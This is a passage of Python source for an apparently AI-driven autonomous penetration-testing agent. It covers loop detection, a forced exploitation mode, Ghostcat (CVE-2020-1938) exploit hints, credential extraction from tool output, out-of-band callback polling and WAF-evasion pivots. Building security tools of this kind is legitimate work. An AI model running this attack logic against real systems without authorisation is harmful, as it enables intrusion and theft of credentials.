                    # Used to stop the AJP-Ghostcat-style 'same script, slightly
                    # different comment' loop.
                    norm_count = self._record_normalized_cmd(command)

                    # If command succeeded, mark the tool as completed in the attack chain
                    if result.ok and command:
                        tool_name = command.split()[0].lower()
                        summary = (result.stdout or result.stderr or "")[:100]
                        self.planner.mark_step_complete(tool_name, summary)

                    # Record failures in failure memory
                    if not result.ok:
                        self.failure_memory.record_failure(command, cat, result.stderr or result.stdout or "")
                        self.state_db.bump_counter(f"fail_{cat}")
                        # Extract and record a lesson from this failure
                        err_text = (result.stderr or result.stdout or "").lower()
                        if "command not found" in err_text or "not recognized" in err_text or "not found" in err_text:
                            tool_hint = command.split()[0] if command.split() else ""
                            self.failure_memory.record_lesson(
                                f"Tool '{tool_hint}' is not installed — don't use it. "
                                f"Try an alternative tool or install it.",
                                category=cat,
                                context=f"Failed command: {command[:200]}"
                            )
                        elif "permission denied" in err_text or "access denied" in err_text or "forbidden" in err_text:
                            self.failure_memory.record_lesson(
                                f"Permission denied — try with different credentials, "
                                f"elevated privileges, or a different approach.",
                                category=cat,
                                context=f"Failed command: {command[:200]}"
                            )
                        elif "timeout" in err_text or "timed out" in err_text or "no route to host" in err_text:
                            self.failure_memory.record_lesson(
                                f"Connection timeout — target may be firewalled or down. "
                                f"Try a different port, protocol, or approach.",
                                category=cat,
                                context=f"Failed command: {command[:200]}"
                            )
                        elif "invalid option" in err_text or "unrecognized" in err_text or "invalid syntax" in err_text:
                            self.failure_memory.record_lesson(
                                f"Invalid tool syntax — check the command flags and try again with correct options.",
                                category=cat,
                                context=f"Failed command: {command[:200]}"
                            )
                        if new_count == 0:
                            self._recon_no_progress_count += 1
                        else:
                            self._recon_no_progress_count = 0
                        # Same-script-repeat detector: 3+ normalized retries = STOP hint
                        if norm_count >= 3:
                            norm_cmd = self._normalize_command(command)
                            stuck_msg = (
                                f"SAME SCRIPT x{norm_count} (normalized): "
                                f"'{norm_cmd[:80]}' — STOP. "
                                f"Use a different tool, a different protocol, or a "
                                f"known-working exploit (searchsploit, pocs/, exploit-db)."
                            )
                            # If the failing script is an AJP python script, give a
                            # SPECIFIC, actionable hint with proven exploit tools.
                            if any(kw in command.lower() for kw in ('ajp', '8009', 'ghostcat', 'cve-2020-1938')):
                                stuck_msg += (
                                    " | AJP-specific: stop hand-rolling broken AJP packets. "
                                    "Use the proven templates from X19's SCOPE TOOLS list — "
                                    "for port 8009: ajp_ghostcat (probe) and ajp_file_read (read WEB-INF/web.xml). "
                                    "OR: searchsploit -m 48143 (XRAY Ghostcat PoC Python3), "
                                    "OR: nuclei -t cves/2020/CVE-2020-1938.yaml. "
                                    "Do NOT keep rewriting your own AJP script — Tomcat 9.0.30 IS "
                                    "Ghostcat-vulnerable, you just need the right packet structure."
                                )
                            self._stuck_warnings.append(stuck_msg)
                    elif cat in self.RECON_CATS:
                        self._recon_no_progress_count += 1

                    # Auto-trigger forced exploit mode
                    if cat in self.RECON_CATS:
                        self._recon_total += 1
                    has_real_finding = any(
                        f.severity in ("critical", "high", "medium")
                        for f in self.model.findings
                    )
                    # Higher threshold (10) and skip when WAF/CDN is detected — exploit mode is
                    # useless against Akamai/Cloudflare blocking all recon; recon must pivot instead.
                    waf_active = bool(getattr(self, "_cloudflare", False))
                    should_force_exploit = (
                        not self._forced_exploit
                        and not has_real_finding
                        and not waf_active
                        and self._recon_total >= 10
                        and self._recon_no_progress_count >= 4
                    )
                    if should_force_exploit:
                        self._forced_exploit = True
                        print(f"{C.BOLD}{C.R}[!] AUTO PIVOT: Recon threshold reached. Forcing exploitation mode.{C.N}")
                        print(f"{C.Y}[*] Subdomains found: {len(self.model.subdomains)}{C.N}")
                        print(f"{C.Y}[*] Services: {self.model.service_summary()[:200]}{C.N}")
                        self._stuck_warnings.append("AUTO PIVOT: forced exploit mode activated")

                # PoC: check for exploitation success (only for actual executions).
                # Use _verify_exploit_evidence (stricter) so that Tomcat 500 stack-trace
                # pages or generic error output don't get classified as successful RCE.
                if not is_dup and not self._exploitation_success:
                    success = self._verify_exploit_evidence(result.text, command)
                    if success:
                        self.record_poc_step(
                            f"Exploitation evidence detected: {success[:60]}",
                            command, previous_output[:500], "exploit"
                        )
                        # Enter PoC mode if not already
                        if not self._poc_mode:
                            self.enter_poc_mode(f"Exploitation in progress on {self.target}")
                        self._exploitation_success = True
                        print(f"{C.BOLD}{C.R}[!] EXPLOITATION SUCCESS — evidence: {success[:60]}{C.N}")

                # PoC mode: record every command as a step
                if not is_dup and self._poc_mode:
                    cat_label = "exploit" if "exploit" in self._last_service_category else self._last_service_category
                    self.record_poc_step(f"Iteration {self.session.data.get('iterations',0)}: {reasoning[:100] or command[:100]}", command, result.text[:500], cat_label)
                    # If we have exploitation success + poc_mode was triggered, we should stop soon
                    if self._exploitation_success and len(self.poc_chain) >= 5:
                        print(f"{C.BOLD}{C.G}[*] Generating PoC report...{C.N}")
                        poc_path = self.save_poc_report()
                        if poc_path:
                            print(f"{C.G}[+] PoC saved to: {poc_path}{C.N}")
                        print(f"{C.BOLD}{C.G}[+] Exploitation complete — stopping assessment{C.N}")
                        self.stop = True
                        break

                # AntiLoopEngine: observe command with REAL before/after model size
                # (before = pre-extraction, after = post-extraction — so delta > 0)
                _al_before = getattr(self, "_size_before_extraction", self._model_size())
                _al_after = getattr(self, "_size_after_extraction", self._model_size())
                _al_sig = get_antiloop().observe(command, cat, previous_output, _al_before, _al_after)
                self.loop_detector.observe(command, cat, active_node)
                _loop_sig_old = self.loop_detector.detect(self._output_hashes, 5, 3)
                if _al_sig.state == "hard" or _loop_sig_old.state == "hard":
                    self._loop_sig = LoopSignal(state="hard",
                        category=_al_sig.category or _loop_sig_old.category,
                        reason=f"{_al_sig.reason} | {_loop_sig_old.reason}".strip(" |"))
                    banned = self._last_service_category
                    if banned and banned != "other":
                        self._banned_categories.add(banned)
                    print(f"{C.BOLD}{C.R}[!] HARD LOOP DETECTED — {self._loop_sig.reason}. Banning category '{banned}'.{C.N}")
                    previous_output = (
                        f"[SYSTEM: HARD LOOP ({self._loop_sig.reason}). Category '{banned}' is now BANNED. "
                        f"Banned categories: {sorted(self._banned_categories)}. Do NOT run any command in these categories. "
                        f"You MUST switch to a fundamentally different technique and category for the next command. "
                        f"Findings: {self.session.findings_summary()}]"
                    )
                    self._stuck_warnings.append(f"Hard loop: {self._loop_sig.reason} — banned '{banned}'")
                    self.state_db.update_goal("self_debug")
                    halted, halt_reason = get_antiloop().is_halted()
                    if halted:
                        print(f"{C.BOLD}{C.R}[!] CIRCUIT BREAKER: {halt_reason}. Stopping run.{C.N}")
                        self._stuck_warnings.append(f"ANTILOOP HALT: {halt_reason}")
                        self.stop = True
                elif _al_sig.state == "soft" or _loop_sig_old.state == "soft":
                    self._loop_sig = LoopSignal(state="soft",
                        category=_al_sig.category or _loop_sig_old.category,
                        reason=_al_sig.reason or _loop_sig_old.reason)
                    print(f"{C.Y}[!] Soft loop detected ({self._loop_sig.reason}){C.N}")
                else:
                    self._loop_sig = LoopSignal(state="none", reason="")
            else:
                previous_output = ""
                self._last_reflection = ""
                time.sleep(1)

            # OOB/Interactsh polling: check for blind interactions (SSRF, RCE callbacks, DNS out-of-band)
            try:
                from attacks import get_oob
                oob = get_oob()
                if oob and oob._available:
                    oob_hits = oob.poll()
                    if oob_hits:
                        for hit in oob_hits[-5:]:
                            msg = f"[OOB INTERACTION] {hit['protocol']}: {hit['full-id']} from {hit.get('raw',{}).get('remote-address','?')}"
                            print(f"{C.BOLD}{C.G}{msg}{C.N}")
                            self.model.add_finding(Finding(
                                severity="high",
                                title=f"OOB Interaction: {hit['protocol']} callback",
                                description=msg,
                                evidence=str(hit['raw'])[:500],
                            ))
                        previous_output = (f"[SYSTEM: {len(oob_hits)} OOB interaction(s) detected! "
                            "This confirms a blind SSRF, RCE, or template injection. "
                            f"Last: {oob_hits[-1]['protocol']} from {oob_hits[-1].get('raw',{}).get('remote-address','?')}. "
                            "Escalate this finding immediately.")[:3000]
            except Exception as _oob_err:
                pass

            # No-progress tracker: did this iter add a finding/endpoint/port?
            try:
                grew = self._model_size() - getattr(self, "_iter_start_size", 0)
                if grew > 0:
                    self._no_progress_streak = 0
                else:
                    self._no_progress_streak += 1
            except Exception:
                pass
            # Auto-save state every 5 iterations
            if iteration % 5 == 0:
                self._save_model_state()

        self._save_model_state()
        self.session.data["status"] = "completed" if not self.stop else "interrupted"
        self.session.save()
        self.running = False

        # Stop proxy
        if self._proxy_active:
            self.proxy.stop()
            self._proxy_active = False
            print(f"{C.Y}[*] Proxy stopped{C.N}")

        # Learn from session
        self._learn_from_session()

        n_less = self.memory.count("lessons") if self.memory.ready else 0
        n_tech = self.memory.count("techniques") if self.memory.ready else 0
        research_hits = len(self._research_log)
        print(f"{C.G}[+] Memory: {n_tech} techniques, {n_less} lessons (research log: {research_hits} entries){C.N}")
        if n_less > n_tech:
            print(f"{C.G}[+] Learning balance: lessons ({n_less}) > techniques ({n_tech}) — researcher mindset active{C.N}")

        # Record performance and run self-improvement
        try:
            agent_state = {
                "stuck_warnings": self._stuck_warnings,
                "auth_attack_blocked": self._auth_attack_blocked,
                "recon_total": self._recon_total,
                "forced_exploit": self._forced_exploit,
            }
            self.perf_analyzer.record_session(self.model, self.session.data, agent_state)
            improvements = self.perf_analyzer.analyze()
            if improvements:
                print(f"{C.M}[Self-Improve] {len(improvements)} improvement suggestions found{C.N}")
                for imp in improvements[:3]:
                    print(f"{C.Y}  - [{imp.area}] {imp.observation[:120]}{C.N}")
                self._pending_improvements = improvements
                if not is_fast_mode():
                    self.self_improve_cycle()
        except Exception as e:
            log(f"[Self-Improve] Error: {e}")

        print(f"\n{C.BOLD}{C.G}{'='*60}{C.N}")
        if decisions_ok == 0:
            print(f"{C.BOLD}{C.R}[!] Assessment did NOT run — the AI never returned a usable decision{C.N}")
            print(f"{C.Y}    Check API key/quota/network for provider '{self.ai.name()}'.{C.N}")
            self.session.data["status"] = "failed"
        else:
            print(f"{C.BOLD}{C.G}[+] Assessment complete — {len(self.model.findings)} findings{C.N}")
            self.session.data["status"] = "completed"
        print(f"{C.BOLD}{C.G}{'='*60}{C.N}")

        report = self.session.report()
        self._save_report(report)
        # Automated prioritized report (real-time exploit availability + remediation).
        try:
            if self.session.id:
                failures = {}
                if hasattr(self, "failure_memory") and self.failure_memory:
                    failures = self.failure_memory._data.get("failures", {}) or {}
                md = build_report(
                    self.model.hostname or self.session.data.get("target", "target"),
                    self.session.data.get("findings", []),
                    tool_failures=failures,
                    tool_effectiveness=getattr(self, "_tool_effect", {})
                )
                md_path = Path(CONFIG.SESSIONS_DIR) / f"{self.session.id}_report.md"
                md_path.write_text(md, encoding="utf-8")
                print(f"{C.G}[+] Prioritized report: {md_path}{C.N}")
        except Exception as e:
            log(f"[report] markdown report failed: {e}")
        self.session.data["model"] = self.model.to_dict()
        self.session.save()
        return self.model.findings

    def _learn_from_session(self):
        """Store session lessons, techniques, and command patterns into ChromaDB."""
        if not self.memory.ready:
            return
        findings = self.model.findings
        cmd_hist = self.session.data.get("commands", [])

        # Build service list from model ports
        services = {}
        for p in self.model.ports:
            services[str(p["port"])] = f"{p['service']} {p.get('version', '')}".strip()

        lesson_count = 0
        tech_count = 0

        # Store research log entries as lessons first (failures = best lessons)
        for entry in self._research_log:
            if entry.get("lesson"):
                lesson_text = f"Lesson: {entry['lesson']} | Hypothesis: {entry.get('hypothesis','')[:100]} | Result: {entry.get('result','')}"
                self.memory.add("lessons", lesson_text, {
                    "target": self.target, "type": self.target_type,
                    "hypothesis": entry.get("hypothesis","")[:200],
                    "result": entry.get("result",""),
                    "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
                })
                lesson_count += 1

        for cmd_entry in cmd_hist[-30:]:
            cmd = cmd_entry.get("cmd", "")
            result = cmd_entry.get("result", "")
            rl = result.lower()

            real_success_markers = ["vulnerable", "login successful", "credentials",
                                    "cracked", "rce", "shell", "access granted",
                                    "successfully executed", "extracted", "dumped"]
            if any(marker in rl for marker in real_success_markers):
                technique = f"Technique: {cmd[:150]} — Result: {result[:200]}"
                self.memory.add("techniques", technique, {
                    "target": self.target, "type": self.target_type,
                    "command": cmd[:200], "result_snippet": result[:200],
                    "category": self._cmd_category(cmd),
                    "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
                    "success": True,
                })
                tech_count += 1

            real_failure_markers = ["failed", "denied", "refused", "timeout", "command not found", "no such file", "error", "unreachable", "could not connect"]
            tool_names = ["nmap", "curl", "gobuster", "hydra", "smb", "ssh", "sql", "enum", "ffuf", "dirsearch", "nuclei", "subfinder", "httpx", "amass", "dig", "wpscan", "searchsploit", "whatweb", "wget", "masscan"]
            if any(marker in rl for marker in real_failure_markers):
                if any(marker in cmd.lower() for marker in tool_names):
                    tool = cmd.split()[0].lower() if cmd.split() else "unknown"
                    target_host = self._target_host()[:40]
                    lesson_text = f"Failed: {cmd[:120]} — {result[:200]}"
                    self.memory.add("lessons", lesson_text, {
                        "target": self.target, "type": self.target_type,
                        "command": cmd[:200], "result_snippet": result[:200],
                        "category": self._cmd_category(cmd),
                        "tool": tool, "host": target_host,
                        "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
                        "success": False,
                    })
                    lesson_count += 1

            port_matches = re.findall(r'(\d+)/(?:tcp|udp)\s+open', result)
            if port_matches:
                self.memory.add("techniques", f"Open ports found: {', '.join(set(port_matches[:10]))} via {cmd[:80]}", {
                    "target": self.target, "type": self.target_type,
                    "command": cmd[:200], "ports": ', '.join(set(port_matches[:10])),
                    "category": "port_scan", "success": True,
                })

        # Store findings as lessons
        if not findings:
            self.memory.add("lessons", f"Session on {self.target}: no findings discovered.", {
                "target": self.target, "type": self.target_type, "finding_count": 0,
                "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
            })
        else:
            for f in findings:
                lesson = f"Found [{f.severity.upper()}] {f.title} on {self.target}. Detail: {f.description}"
                self.memory.add("lessons", lesson, {
                    "target": self.target, "type": self.target_type, "severity": f.severity,
                    "title": f.title, "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
                })
            n_sev = len([f for f in findings if f.severity in ("critical", "high")])
            self.memory.add("lessons", f"Session on {self.target}: {len(findings)} findings ({n_sev} high/critical). Type: {self.target_type}", {
                "target": self.target, "type": self.target_type, "finding_count": len(findings),
                "high_count": n_sev, "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
            })

        # Proactive profile update with tool effectiveness
        if cmd_hist:
            cats = [self._cmd_category(c.get("cmd", "")) for c in cmd_hist[-50:]]
            top_cats = Counter(cats).most_common(3)
            profile_text = f"Session preferences: top categories = {', '.join(f'{c}({n})' for c,n in top_cats)}"
            # Add current target type preference
            profile_text += f" | Preferred target_type: {self.target_type}"
            self.memory.add("profile", profile_text, {
                "target": self.target, "type": self.target_type,
                "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
            })

        # Proactive: Store port/service patterns for future prediction
        for port in self.model.ports[:10]:
            svc = port.get("service", "")
            if svc and svc != "unknown":
                self.memory.add("port_patterns", f"Target {self.target}: port {port['port']}/{port['proto']} runs {svc}", {
                    "target": self.target, "port": port["port"], "proto": port["proto"], "service": svc,
                    "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
                })

        print(f"{C.G}[+] Memory updated: {len(findings)} findings, {tech_count} techniques learned{C.N}")

    def _extract_technique_from_output(self, cmd: str, output: str) -> Optional[str]:
        """Extract a reusable technique pattern from command output."""
        if not output or len(output) < 10:
            return None
        tech = None
        # Extract subdomains discovered
        subdomains = re.findall(r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.){2,}[a-zA-Z]{2,}\b', output)
        real_subdomains = [s for s in subdomains if s.count('.') >= 2 and not s.startswith('http')]
        if real_subdomains:
            tech = f"Subdomain discovery via {cmd[:60]}: {', '.join(real_subdomains[:5])}"
        # Extract URLs discovered
        urls = re.findall(r'https?://[^\s<>"\'\[\]]+', output)
        if urls and not tech:
            tech = f"Discovered endpoints via {cmd[:60]}: {' '.join(urls[:3])}"
        # Extract credentials
        creds = re.findall(r'(?:username|user|login|email)[=:\s]+(\S+)[,\s]+(?:password|pass|pwd)[=:\s]+(\S+)', output, re.I)
        if creds:
            tech = f"Extracted credentials via {cmd[:60]}: user={creds[0][0]}"
        # Extract open ports
        ports = re.findall(r'(\d+)/(?:tcp|udp)\s+open', output)
        if ports and not tech:
            tech = f"Port discovery via {cmd[:60]}: {', '.join(ports[:5])}"
        # Extract versions
        versions = re.findall(r'(\S+)\s+(\d+\.\d+[^\s]*)', output)
        if versions and not tech:
            tech = f"Version detection via {cmd[:60]}: {versions[0][0]} {versions[0][1]}"
        # Extract live hosts from httpx output
        if '[200]' in output or '[301]' in output or '[302]' in output:
            live = re.findall(r'(https?://[^\s]+)\s+\[', output)
            if live:
                tech = f"Live hosts via {cmd[:60]}: {', '.join(live[:5])}"
        return tech

    # ===================== RECON PRIORITIZATION / PROBE REGISTRY =====================

    DEAD_STATUSES = {301, 302, 303, 307, 308, 401, 403, 404, 410}
    _SKIP_STATUSES = {301, 302, 303, 307, 308, 404, 410}  # genuinely-dead: never worth re-requesting
    _PROBE_CATS = ("web", "fingerprint", "web_scanner")

    @staticmethod
    def _urls_in(command: str) -> List[str]:
        return [u.rstrip('/') for u in re.findall(r'https?://[^\s\'"`|>]+', command)]

    @staticmethod
    def _statuses_in(text: str) -> List[int]:
        s = re.findall(r'\[(\d{3})\]', text) + re.findall(r'Status:\s*(\d{3})', text) \
            + re.findall(r'HTTP/\d(?:\.\d)?\s+(\d{3})', text)
        return [int(x) for x in s]

    @staticmethod
    def _fingerprint(command: str, result: "ToolResult") -> Optional[dict]:
        """SHA256 fingerprint of a single HTTP response: {sha256,length,content_type,status}. None if no body."""
        import hashlib
        body = result.stdout or ""
        norm = re.sub(r'\s+', ' ', body).strip()
        if not norm:
            return None
        ct = ""
        m = re.search(r'(?im)^\s*content-type:\s*([^\r\n;]+)', body)
        if m:
            ct = m.group(1).strip().lower()
        statuses = X19._statuses_in(result.text or "")
        if len(set(statuses)) > 1:
            log(f"[PARSE_AMBIGUOUS] statuses={statuses} in '{command[:60]}' — using final {statuses[-1]}")
        st = statuses[-1] if statuses else (200 if result.ok else -1)
        return {
            "sha256": hashlib.sha256(norm.encode("utf-8", "ignore")).hexdigest(),
            "length": len(body),
            "content_type": ct,
            "status": st,
        }

    def _response_is_success(self, url: str, fp: Optional[dict]) -> bool:
        """HTTP 200 alone is NEVER success. Requires a 2xx whose body DIFFERS from the
        unauthenticated baseline — an auth test returning the baseline page is not a bypass."""
        if not fp or not (200 <= (fp.get("status") or 0) < 300):
            return False
        h = fp["sha256"]
        # Same body on a catch-all wall, or identical across >=2 endpoints (e.g. the same JSON
        # error like {"success":false,...}), is a generic response — never a real hit.
        if h in self._walls or len(self._body_paths.get(h, set())) >= 2:
            return False
        base = self._fp_baseline.get(url)
        return base is None or h != base

    def _should_skip_probe(self, command: str) -> Optional[str]:
        """Block re-probing exhausted, dead (404/403/redirect), or soft-404 wall endpoints."""
        if self._cmd_category(command) != "web":
            return None  # only plain curl/wget re-requests; scanners/bypass tools stay allowed
        urls = self._urls_in(command)
        if len(urls) != 1:
            return None
        url = urls[0]
        if url in self._exhausted_endpoints:
            return f"{url} is EXHAUSTED (5+ identical responses) — do not re-test; switch technique/target."
        rec = self._probed.get(url)
        if not rec:
            return None
        if rec["status"] in self._SKIP_STATUSES:
            return f"{url} already returned HTTP {rec['status']} (dead/redirect) — do not re-request."
        if rec["body"] in self._walls:
            return f"{url} returned an identical soft-404/catch-all page — re-probing is worthless."
        return None

    def _register_probe(self, command: str, result: "ToolResult"):
        """SHA256-fingerprint each response: store record, detect duplicates, mark exhausted after
        5 identical, set the unauth baseline, and keep dead/catch-all-wall tracking."""
        if self._cmd_category(command) not in self._PROBE_CATS:
            return
        urls = self._urls_in(command)
        if len(urls) != 1:
            return
        url = urls[0]
        fp = self._fingerprint(command, result)
        if not fp:
            return
        h = fp["sha256"]
        self._fp_records[url] = fp  # req 6: store hash,length,content-type,status
        log(f"[PROBE_FP] {url} sha256={h[:12]} len={fp['length']} ct={fp['content_type'] or '?'} status={fp['status']}")
        self._probe_log.append(h)            # req 6: duplicate-ratio window
        self._probe_log = self._probe_log[-40:]
        if h in self._seen_hashes:  # req 2: duplicate detection
            log(f"[PROBE_DUP] {url} sha256={h[:12]} — identical to a previously seen response")
        self._seen_hashes.add(h)
        self._fp_baseline.setdefault(url, h)  # req 4: first response = baseline
        cat = self._cmd_category(command)
        key = (url, h)  # req 3: exhaust after 5 identical
        self._fp_counts[key] = self._fp_counts.get(key, 0) + 1
        if self._fp_counts[key] >= 5 and url not in self._exhausted_endpoints:
            self._mark_endpoint_exhausted(url, cat)
            log(f"[PROBE_EXHAUSTED] {url} — 5 identical responses (sha256={h[:12]})")
        # Dead-endpoint + catch-all-wall tracking (body key is now the sha256)
        st = fp["status"]
        self._probed[url] = {"status": st, "body": h}
        seen = self._body_paths.setdefault(h, set())
        seen.add(url)
        if len(seen) >= 3:  # same body across >=3 paths = catch-all wall
            self._walls.add(h)
        if len(seen) >= 5 and h not in self._exhausted_fingerprints:  # req 3: identical fingerprint on 5+ endpoints
            self._exhausted_fingerprints.add(h)
            log(f"[RECON_SAT] fingerprint {h[:12]} EXHAUSTED — identical body on {len(seen)} endpoints")
            for u in seen:
                self._mark_endpoint_exhausted(u, cat)
        elif h in self._exhausted_fingerprints:
            self._mark_endpoint_exhausted(url, cat)
        if st and st > 0:
            self.model.set_endpoint_status(url, st)

    def _mark_endpoint_exhausted(self, url: str, cat: str):
        """Mark an endpoint exhausted; 10+ in the same category (pattern) exhausts the technique (req 4)."""
        self._exhausted_endpoints.add(url)
        ex = self._exhausted_by_cat.setdefault(cat, set())
        ex.add(url)
        if len(ex) >= 10 and cat not in self._exhausted_techniques:
            self._exhausted_techniques.add(cat)
            log(f"[RECON_SAT] technique '{cat}' EXHAUSTED — 10+ exhausted endpoints")

    def _recon_saturation(self) -> dict:
        """Pivot score = duplicate ratio of the last N probes; saturated triggers a forced strategy change."""
        window = self._probe_log[-12:]
        n = len(window)
        dups = n - len(set(window)) if n else 0
        pivot = (dups / n * 100.0) if n else 0.0
        saturated = (n >= 12 and pivot >= 60.0) or bool(self._exhausted_techniques) \
            or (self._cloudflare and len(self._exhausted_endpoints) >= 3) \
            or self._cf_count >= 5                       # req 4: 5+ identical CF challenges → saturated
        return {"pivot_score": pivot, "duplicates": dups,
                "exhausted_endpoints": len(self._exhausted_endpoints), "saturated": saturated}

    def _recon_blocked(self, command: str) -> Optional[str]:
        """Unified recon gate (req 8): exhausted endpoints/patterns/techniques + Cloudflare/constraint path-fuzz.
        Real-world: forced exploit mode only blocks the EXHAUSTED technique, not ALL recon.
        Targeted recon for exploitation (e.g., probing a specific endpoint) is still allowed."""
        skip = self._should_skip_probe(command)
        if skip:
            return skip
        for k in self._vector_keys(command):  # loop state-machine: same vector + same HTTP code >2x → terminated
            if k in self._terminated_vectors:
                return f"attack vector {k[0]}={k[1]} TERMINATED (same HTTP response 3x) — switch vector/target."
        cat = self._cmd_category(command)
        if self._forced_exploit and cat in self._exhausted_techniques:
            return f"FORCED EXPLOIT + EXHAUSTED: technique '{cat}' is exhausted — switch to exploit commands only."
        if cat in self._exhausted_techniques:
            return f"technique '{cat}' is EXHAUSTED (10+ dead endpoints) — switch strategy, never reuse."
        # req 8: an active 'generic fuzzing ineffective' constraint (e.g. Cloudflare) prohibits fuzzing plans
        if cat == "web_dirbust" and self._constraint_active("generic_fuzzing_ineffective"):
            return "ACTIVE CONSTRAINT: generic fuzzing/path discovery is ineffective (Cloudflare/WAF) — pivot to origin-IP/API/auth."
        for u in self._urls_in(command):
            rec = self._probed.get(u.rstrip('/'))
            if rec and rec.get("body") in self._exhausted_fingerprints:
                return f"{u} returns an EXHAUSTED fingerprint (identical body on 5+ endpoints) — pointless."
        return None

    _CF_MARKERS = ("just a moment...", "attention required! | cloudflare", "__cf_chl",
                   "challenge-platform", "cf-mitigated", "checking your browser before",
                   "cf-chl-", "enable javascript and cookies to continue", "ray id:")

    _WAF_MARKERS = _CF_MARKERS + (
        "edgesuite.net", "akamai", "akamaiedge", "reference #", "ak_bmsz", "akamai-ghost",
        "akamaighost",
        "imperva", "incapsula", "impervablock",
        "cloudfront", "x-amz-cf-id", "x-cache: error from cloudfront",
        "sucuri", "access denied - sucuri",
        "barracuda", "f5-bigip", "f5-trafficshield",
    )

    _WAF_VENDORS = {
        "akamai": "AKAMAI",
        "edgesuite.net": "AKAMAI",
        "akamaighost": "AKAMAI",
        "akamaiedge": "AKAMAI",
        "imperva": "IMPERVA",
        "incapsula": "IMPERVA",
        "cloudfront": "CLOUDFRONT",
        "x-amz-cf-id": "CLOUDFRONT",
        "sucuri": "SUCURI",
        "barracuda": "BARRACUDA",
        "f5-bigip": "F5",
        "f5-trafficshield": "F5",
    }

    def _detect_waf_vendor(self, result: "ToolResult") -> str:
        blob = ((result.stdout or "") + " " + (result.stderr or "")).lower()
        for marker, vendor in self._WAF_VENDORS.items():
            if marker in blob:
                return vendor
        if any(m in blob for m in self._CF_MARKERS):
            return "CLOUDFLARE"
        return ""

    def _track_cloudflare(self, result: "ToolResult") -> bool:
        """req 1-4: classify Cloudflare challenge as a CLOUDFLARE_CHALLENGE fingerprint; count duplicates/saturation.
        Extended: now also detects Akamai/Imperva/CloudFront/Sucuri/F5 as generic WAF_BLOCKED fingerprints."""
        blob = ((result.stdout or "") + " " + (result.stderr or "")).lower()
        is_waf = any(m in blob for m in self._WAF_MARKERS)
        is_cf  = any(m in blob for m in self._CF_MARKERS)
        if not is_waf:
            return False
        vendor = self._detect_waf_vendor(result) or ("CLOUDFLARE" if is_cf else "WAF")
        fingerprint = f"{vendor}_BLOCKED"
        self._cloudflare = True
        self._waf_vendor = vendor
        self._cf_count += 1
        self._probe_log.append(fingerprint)
        del self._probe_log[:-40]
        log(f"[RECON_SAT] {fingerprint} x{self._cf_count} vendor={vendor}")
        # First WAF hit: hard-block port_scan and web_dirbust. WAF answers 403 on most ports
        # so port scanning is a pure waste; pivot to subdomains/origin-IP/dns immediately.
        self._exhausted_techniques.add("port_scan")
        self._exhausted_techniques.add("web_dirbust")
        self._banned_categories.add("port_scan")
        self._banned_categories.add("web_dirbust")
        self.add_constraint("generic_fuzzing_ineffective",
            f"Generic fuzzing/path discovery blocked by {vendor} WAF — pivot to origin-IP / subdomains / known-CVE / API / auth.",
            f"{vendor} block observed: {blob[:120]}")
        return True

    def add_constraint(self, name: str, conclusion: str, evidence: str, expires: str = "until target changes / signal clears"):
        """req 6: planner memory — conclusion + supporting evidence + expiration condition (deduped by name)."""
        if any(c["name"] == name for c in self._constraints):
            return
        self._constraints.append({"name": name, "conclusion": conclusion,
                                  "evidence": (evidence or "")[:200], "expires": expires})
        print(f"{C.R}[CONSTRAINT+] {conclusion}{C.N}")

    def _active_constraints(self) -> list:
        """Constraints stay active for the engagement (reset per target). Premature expiry would let the
        planner ignore its own conclusion — the exact bug this prevents. 'expires' documents intent only."""
        return list(self._constraints)

    def _constraint_active(self, name: str) -> bool:
        return any(c["name"] == name for c in self._active_constraints())

    def _capture_conclusions(self, text: str):
        """req 5: turn the planner's own conclusions into hard constraints."""
        t = (text or "").lower()
        if re.search(r'(fuzz\w*|brute\w*|dirbust|directory|path discovery)[^.]{0,40}'
                     r'(won.?t work|not work|ineffective|useless|pointless|waste|dead|blocked|futile)', t) \
           or re.search(r'(cloudflare|waf)[^.]{0,30}(challenge|block|protect)', t):
            self.add_constraint("generic_fuzzing_ineffective",
                "Generic fuzzing/path discovery concluded ineffective — pivot strategy.",
                "planner conclusion: " + (text or "").strip()[:160])

    def _vector_keys(self, command: str) -> list:
        """Attack-vector identity: the target URL and (for attack tools) the payload class/category."""
        keys = []
        urls = self._urls_in(command)
        if urls:
            keys.append(("url", urls[0].rstrip('/')))
        cat = self._cmd_category(command)
        if cat in ("web_dirbust", "web_exploit", "web_scanner"):
            keys.append(("class", cat))
        return keys

    def _track_vector(self, command: str, result: "ToolResult"):
        """State machine: same URL or payload class returning the same HTTP code >2x ends that vector."""
        statuses = self._statuses_in(result.text or "")
        code = statuses[-1] if statuses else None   # strictly HTTP-response-code driven
        if not code or code <= 0:
            return
        for k in self._vector_keys(command):
            codes = self._vector_codes.setdefault(k, {})
            codes[code] = codes.get(code, 0) + 1
            if codes[code] > 2 and k not in self._terminated_vectors:
                self._terminated_vectors.add(k)
                print(f"{C.R}[VECTOR TERMINATED] {k[0]}={k[1]} → HTTP {code} x{codes[code]} — abandoning this attack vector.{C.N}")
                log(f"[LOOP_SM] terminated vector {k} after {codes[code]} HTTP {code} responses")

    @staticmethod
    def _score_endpoint(ep: dict) -> float:
        st = ep.get("status") or 0
        s = 0.5
        if st == 200: s += 0.3
        elif st in (401, 403): s += 0.15  # protected = interesting, not free
        elif st in (301, 302, 303, 307, 308, 404, 410): s -= 0.35
        if ep.get("params"): s += 0.2
        if ep.get("tech"): s += 0.1
        return max(0.0, min(1.0, s))

    @staticmethod
    def _score_subdomain(sub: str) -> float:
        low = sub.lower()
        s = 0.4
        if any(k in low for k in ("admin", "dev", "stag", "test", "api", "internal", "vpn", "git",
                                  "jenkins", "jira", "grafana", "kibana", "dashboard", "portal", "beta")):
            s += 0.4
        if any(low.startswith(p) for p in ("www.", "cdn.", "static.", "img.", "assets.", "media.", "mail.")):
            s -= 0.3
        return max(0.0, min(1.0, s))

    def _model_size(self) -> int:
        m = self.model
        return len(m.subdomains) + len(m.endpoints) + len(m.ports) + len(m.findings) + len(m.credentials)

